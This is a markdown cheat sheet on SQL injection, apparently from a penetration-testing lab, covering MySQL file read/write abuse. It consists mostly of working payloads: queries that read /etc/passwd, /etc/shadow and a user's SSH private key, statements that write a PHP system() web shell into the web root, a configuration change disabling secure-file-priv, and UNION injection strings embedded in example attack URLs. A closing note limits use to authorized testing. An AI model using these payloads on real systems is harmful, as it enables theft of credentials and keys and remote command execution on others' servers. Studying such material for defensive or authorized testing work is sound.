# 🎯 Dumping Data Injection

> **A comprehensive guide to SQL Injection techniques for data extraction and web shell deployment**

---

## 📋 Table of Contents

- [MySQL Configuration](https://claude.ai/chat/34d03a35-1af8-4920-987b-93e072609bbc#mysql-configuration)
- [Database Commands](https://claude.ai/chat/34d03a35-1af8-4920-987b-93e072609bbc#database-commands)
- [Reading System Files](https://claude.ai/chat/34d03a35-1af8-4920-987b-93e072609bbc#reading-system-files)
- [Writing Web Shells](https://claude.ai/chat/34d03a35-1af8-4920-987b-93e072609bbc#writing-web-shells)
- [SQL Injection Payloads](https://claude.ai/chat/34d03a35-1af8-4920-987b-93e072609bbc#sql-injection-payloads)
- [Example Attack URLs](https://claude.ai/chat/34d03a35-1af8-4920-987b-93e072609bbc#example-attack-urls)

---

## ⚙️ MySQL Configuration

### Edit the MySQL Configuration File

```bash
vim /etc/mysql/mysql.conf.d/mysqld.cnf
```

### Add or Update Settings Under `[mysqld]` Section

```ini
[mysqld]
pid-file= /var/run/mysqld/mysqld.pid
socket= /var/run/mysqld/mysqld.sock
datadir= /var/lib/mysql
log-error= /var/log/mysql/error.log
# Execute file privilege enabled
secure-file-priv = ""
```

### 🔄 Restart MySQL Service

```bash
systemctl restart mysql.service
```

### 🌐 Connecting to MySQL Remotely

```bash
mysql -u root -h 192.168.1.31 -p
```

---

## 💾 Database Commands to Exploit Dumping Data Injection

### Basic Database Operations

```sql
USE sqli_db;
```

```sql
SHOW TABLES;
```

```sql
SELECT * FROM users;
```

### 📤 Dumping Entire Users Table to File

```sql
SELECT * FROM users INTO OUTFILE "/tmp/users.txt";
```

### 🎯 Dumping Specific User Row to File

```sql
SELECT * FROM users WHERE id='1' INTO OUTFILE "/tmp/users.txt";
```

---

## 📂 Reading System Files

### Password Files

```sql
SELECT LOAD_FILE("/etc/passwd");
```

```sql
SELECT LOAD_FILE("/etc/passwd") INTO OUTFILE "/tmp/passwd";
```

### Shadow File

```sql
SELECT LOAD_FILE("/etc/shadow") INTO OUTFILE "/tmp/shadow";
```

### SSH Keys

```sql
SELECT LOAD_FILE("/home/armour/.ssh/id_rsa") INTO OUTFILE "/tmp/id_rsa";
```

---

## 🐚 Writing Web Shell to tmp and Web Accessible Locations

### Reverse Shell to /tmp

```sql
SELECT "<?php system(\$_GET['c']);?>" INTO OUTFILE "/tmp/rev_shell.php";
```

### Web Shell to Accessible Location

```sql
SELECT "<?php system(\$_GET['c']);?>" INTO OUTFILE "/var/www/html/webpen/shell.php";
```

---

## 🔗 Combining Data Extraction with Web Shell Writing

```sql
SELECT * FROM users WHERE id='1' 
UNION ALL 
SELECT 1,2,3,4,"<?php phpinfo() ?>" 
INTO OUTFILE "/tmp/phpinfo1.php";
```

---

## 🚀 SQL Injection Payload Examples for Data Dumping and Web Shell Upload

### 💣 Payload 1: Dump Table to /tmp

```sql
' UNION ALL SELECT email,password,3,4,5 FROM gym.tbladmin INTO OUTFILE "/tmp/tbladmin.txt" --
```

**Example URL:**

```
http://192.168.1.31/webpen/sqli/error-based-string.php?id=-1' UNION ALL SELECT 1,LOAD_FILE("/etc/passwd"),3,4,5 INTO OUTFILE "/tmp/passwd1.txt" --
```

---

### 🎯 Payload 2: Write Shell via Error-Based Injection

```sql
' UNION ALL SELECT email,password,3,4,5 FROM gym.tbladmin INTO OUTFILE "/var/www/html/webpentest/sqli/upload/tbladmin.txt" --
```

**Example URL:**

```
http://192.168.1.31/webpentest/sqli/Error-based-string.php?id=-1' UNION ALL SELECT 1,"<?php system($_GET['c']);?>",3 INTO OUTFILE "/tmp/shell.php" --+
```

---

### 🔥 Payload 3: Boolean Blind Injection with phpinfo()

```sql
' UNION ALL SELECT 1,2,3,4,"<?php phpinfo() ?>" INTO OUTFILE "/var/www/html/sqli/phpinfo.php" --+
```

**Example URL:**

```
http://192.168.1.32/sqli/blind-injection-boolean-type.php?id=1' UNION ALL SELECT 1,2,3,4,"<?php phpinfo() ?>" INTO OUTFILE "/var/www/html/sqli/phpinfo.php" --+
```

---

## 🛡️ Security Notes

> ⚠️ **Warning:** These techniques are for **authorized penetration testing only**. Unauthorized access to computer systems is illegal.

### Key Points:

- ✅ Always obtain proper authorization before testing
- ✅ Use only in controlled lab environments
- ✅ Document all findings responsibly
- ✅ Follow ethical hacking guidelines

---

## 📚 References

- **Test Environment:** 192.168.1.31/32
- **Date:** November 7, 2026
- **Context:** Web Application Penetration Testing

---

<div align="center">

**🔐 Stay Ethical. Stay Legal. Stay Secure.**

</div>